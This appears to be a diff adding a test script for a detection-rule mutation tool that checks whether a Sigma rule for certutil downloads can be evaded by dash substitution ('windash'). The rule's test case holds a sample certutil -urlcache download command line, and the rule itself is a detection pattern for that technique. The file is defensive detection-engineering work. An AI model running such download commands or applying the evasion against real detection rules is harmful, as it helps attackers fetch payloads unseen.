@@ -1,0 +1,29 @@
+# ordeal mutate finds the windash evasion and exits non-zero
+! ordeal mutate .
+stdout 'BREACH'
+stdout 'windash'
+stdout 'EVADED'
+
+# restricting the catalog to a mutator the rule survives yields no evasions
+ordeal mutate . --only case-flip
+stdout 'NO EVASIONS'
+
+-- rule.yml --
+title: Certutil Download
+id: 33333333-3333-3333-3333-333333333333
+logsource:
+  category: process_creation
+  product: windows
+detection:
+  selection:
+    Image|endswith: '\certutil.exe'
+    CommandLine|contains: '-urlcache'
+  condition: selection
+-- rule.test.yml --
+rule: rule.yml
+cases:
+  - name: urlcache fires
+    event:
+      Image: 'C:\Windows\System32\certutil.exe'
+      CommandLine: 'certutil.exe -urlcache -f http://x/y a'
+    match: true
